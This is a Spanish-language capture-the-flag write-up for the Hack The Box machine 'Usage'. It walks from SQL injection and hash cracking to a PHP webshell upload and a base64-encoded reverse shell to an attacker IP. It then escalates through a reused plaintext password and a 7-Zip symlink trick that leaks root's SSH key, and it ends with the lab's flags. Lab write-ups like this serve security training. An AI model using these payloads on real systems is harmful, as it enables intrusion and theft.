---
tags:
  - CTF
  - OSCP
  - linux
  - estado/completo
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/597
dificultad: Fácil
ip: 10.10.11.18
os: Linux
relacionados:
  - "[[SQL Injection (SQLI)|SQLI]]"
  - "[[Cracking Hashes]]"
  - "[[Arbitrary File Upload]]"
  - "[[Binary Analysis]]"
  - "[[ghidra]]"
  - "[[Sudo abuse]]"
  - "[[Symlinks]]"
  - "[[Listfiles]]"
  - "[[Password Reuse]]"
---
# HackTheBox - Usage
## Reconocimiento

### Escaneo Inicial y Enumeración Web

Para comenzar, realicé un escaneo de puertos completo en la máquina objetivo utilizando **Nmap**. El objetivo era identificar todos los servicios expuestos.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG logs/allports
nmap -sCV -p22,80,389,443,5667 $(cat ip) -oN logs/usage-sCV
```

El resultado del escaneo reveló dos puertos abiertos:
- **Puerto 22:** Corriendo `OpenSSH 8.9p1`.
- **Puerto 80:** Corriendo un servidor web `nginx 1.18.0`.
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 04:48 CDT
Nmap scan report for 10.10.11.18
Host is up (0.0087s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

El servidor web en el puerto 80 intentaba redirigirme a `http://usage.htb/`, por lo que agregué este dominio a mi archivo `/etc/hosts` para resolverlo correctamente.
```Bash
echo '10.10.11.18 usage.htb' | sudo tee -a /etc/hosts
```

Al navegar a `usage.htb`, me encontré con una página de inicio de sesión que también ofrecía opciones para registrarse y acceder a un panel de administrador. El enlace al panel de administrador me redirigió a `admin.usage.htb`, así que también agregué este subdominio a mi archivo de hosts.
```Bash
echo '10.10.11.18 admin.usage.htb' | sudo tee -a /etc/hosts
```

Decidí registrar una nueva cuenta en `usage.htb` para explorar la funcionalidad de la aplicación. Una vez dentro, me encontré con un blog bastante simple, sin muchas funcionalidades aparentes.


---

## Análisis de vulnerabilidades

### Identificación de SQL Injection

Regresé a la página de inicio de sesión y exploré la funcionalidad de "Olvidé mi contraseña" en `/forget-password`. Noté un comportamiento interesante: al ingresar un correo electrónico registrado, recibía un mensaje de éxito, pero con un correo no registrado, el mensaje era de error. Esta diferencia en las respuestas me hizo sospechar que la aplicación realizaba una consulta a la base de datos para verificar la existencia del correo, lo que abría la puerta a una posible **inyección SQL**.

Para confirmar mi sospecha, probé un payload clásico de SQLi basado en booleanos:
```SQL
test' or 1=1;-- -
```

> [!NOTE] Explicación del Payload de SQLi
> 
> La comilla simple (') busca cerrar la cadena de texto esperada por la consulta SQL. La condición OR 1=1 fuerza a que la cláusula WHERE siempre sea verdadera. Finalmente, ;-- - finaliza la consulta y comenta el resto, evitando errores de sintaxis.

Al enviar este payload en el campo de correo electrónico, la aplicación devolvió el mensaje de éxito, confirmando que el campo era vulnerable a **SQL Injection**.


---

## Explotación de vulnerabilidades

### Explotación de SQLi con SQLMap

Con la vulnerabilidad confirmada, decidí automatizar la explotación usando **sqlmap**. Primero, capturé la solicitud `POST` a `/forget-password` con Burp Suite y la guardé en un archivo `reset.req`.
```HTTP
POST /forget-password HTTP/1.1
Host: usage.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://usage.htb/forget-password
Content-Type: application/x-www-form-urlencoded
Content-Length: 58
Origin: http://usage.htb
DNT: 1
Connection: close
Cookie: XSRF-TOKEN=[REDACTED]; laravel_session=[REDACTED]
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

_token=6uUE8l5YHCslGg2gnxdw7n66WgsvMcuXtU196iFa&email=test
```

Mi primer intento con `sqlmap` falló, devolviendo múltiples errores `500` y `503`. Siguiendo la sugerencia de la propia herramienta, aumenté el nivel de las pruebas con `--level 3`, lo que resultó exitoso. `sqlmap` identificó una inyección SQL ciega y determinó que el motor de base de datos era **MySQL**.

Procedí a enumerar las bases de datos con `--dbs`, encontrando `usage_blog`. Luego, enumeré sus tablas con `--tables` y, finalmente, volqué el contenido de la tabla `admin_users` con `--dump`.
```Bash
# Comando final de volcado
sqlmap -r reset.req -p email --batch --level 3 -D usage_blog -T admin_users --dump
```

Obtuve el hash de la contraseña del usuario `admin`.
```
Database: usage_blog
Table: admin_users
[1 entry]
+----+--------------------------------------------------------------+----------+
| id | password                                                     | username |
+----+--------------------------------------------------------------+----------+
| 1  | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | admin    |
+----+--------------------------------------------------------------+----------+
```

### Crackeo de Hash y Acceso al Panel de Administración

Guardé el hash en un archivo y utilicé **John the Ripper** con el diccionario `rockyou.txt` para crackearlo.
```Bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

En pocos segundos, obtuve la contraseña.

> [!SUCCESS] Credenciales Obtenidas
> 
> Usuario: admin
> 
> Contraseña: whatever1

Con estas credenciales, accedí al panel de administración en `admin.usage.htb`.

### Abuso de Carga de Archivos para RCE (CVE-2023-24249)

Dentro del panel, en la pestaña "Dependencies", descubrí que utilizaba `encore/laravel-admin 1.8.18`, una versión vulnerable a **CVE-2023-24249**, una vulnerabilidad de carga arbitraria de archivos.

El plan de explotación fue el siguiente:
1. Crear una webshell en PHP (`shell.php`).
2. Renombrarla con extensión `.jpg` (`shell.jpg`) para eludir el filtro inicial.
3. Interceptar la solicitud de subida y cambiar la extensión a `.jpg.php` para que el servidor la interprete como código PHP.
4. Acceder al archivo subido para ejecutar comandos.

Primero, creé una webshell simple y la renombré.
```Bash
echo '<?php system($_GET["melo"]); ?>' > shell.php
mv shell.php shell.jpg
```

Navegué a la configuración del perfil (`/admin/auth/setting`), seleccioné `shell.jpg` e intercepté la solicitud con Burp Suite para modificar el `filename` a `shell.jpg.php`. La carga fue exitosa. Para verificar la ejecución de código, navegué a la URL del archivo subido.
```
http://admin.usage.htb/uploads/images/shell.jpg.php?melo=id
```

El comando se ejecutó correctamente, revelando que el servidor web corría como el usuario `dash`.

### Obtención de Shell Reversa

Para obtener una shell interactiva, generé un payload de reverse shell con `bash` en **revshells.com**, codificado en Base64. Puse un listener de Netcat a la escucha en mi máquina.
```Bash
nc -nlvp 4444
```

Luego, ejecuté el payload a través de mi webshell usando el siguiente comando, que decodifica y ejecuta la shell.
```Bash
echo 'c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMzAvNDQ0NCAwPiYx' | base64 -d | sh
```

Al acceder a la URL correspondiente, recibí una conexión en mi listener, obteniendo una shell como el usuario `dash`. Finalmente, la estabilicé usando `script`.


---

## Escalada de privilegios

### Movimiento Lateral: de 'dash' a 'xander'

Comencé la enumeración como `dash`. Con `ss -tlpn`, descubrí un servicio llamado `monit` escuchando localmente en el puerto `2812`. Mis intentos de ver procesos de otros usuarios con `ps aux` fallaron, lo que me llevó a revisar `/etc/fstab`.

> [!INFO] Nota sobre hidepid=2
> 
> La opción de montaje hidepid=2 en el sistema de archivos /proc restringe la visibilidad de los procesos. Un usuario normal solo puede ver sus propios procesos, lo que dificulta la enumeración.

En el directorio personal de `dash`, encontré el archivo de configuración `.monitrc`, que contenía credenciales en texto plano.
```
# ...
set httpd port 2812
    use address 127.0.0.1
    allow admin:3nc0d3d_pa$$w0rd
# ...
```

Probé la reutilización de esta contraseña para el otro usuario del sistema, `xander`.
```Bash
su xander
Password: 3nc0d3d_pa$$w0rd
$ id
uid=1001(xander) gid=1001(xander) groups=1001(xander)
```

El intento fue exitoso. Para tener una shell más estable, me conecté directamente por SSH como `xander`.

### Abuso de Binario Sudo para Obtener Acceso Root

Una vez como `xander`, verifiqué sus privilegios de `sudo`.
```Bash
sudo -l
```

```
User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

Descubrí que podía ejecutar `/usr/bin/usage_management` como `root`. Un análisis estático con `strings` reveló el comando exacto que se usaba para las copias de seguridad:
```Bash
/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```

> [!WARNING] Abuso de 7-Zip con Listfiles y Symlinks
> 
> 7-Zip trata los archivos cuyo nombre empieza con @ como un "listfile", leyendo su contenido para saber qué archivos comprimir. Combinando esto con un enlace simbólico, podemos forzar a 7-Zip a leer un archivo privilegiado y mostrar su contenido en la salida.

El plan de ataque fue el siguiente:
1. Navegar a `/var/www/html`, un directorio con permisos de escritura.
2. Crear un "listfile" vacío: `touch @id_rsa`.
3. Crear un enlace simbólico llamado `id_rsa` que apunte a la clave SSH privada del `root`.
```Bash
cd /var/www/html
touch @id_rsa
ln -s /root/.ssh/id_rsa id_rsa
```

Finalmente, ejecuté el binario con `sudo` y seleccioné la opción 1. En la salida de `7-Zip`, se mostró el contenido de la clave SSH privada de `root`. La copié a mi máquina local, le di los permisos correctos (`chmod 600`) y la usé para conectarme.
```Bash
ssh -i id_rsa root@usage.htb
```

Con esto, obtuve acceso completo al sistema como `root`.


---

## Bandera(s)

> [!FLAG] `flag{user}`
> faf0a52a637b8229fb573886670ff87b
^bandera

> [!FLAG] `flag{root}`
> f719e2380a36dedf5f4ef996bbe8d10b
^bandera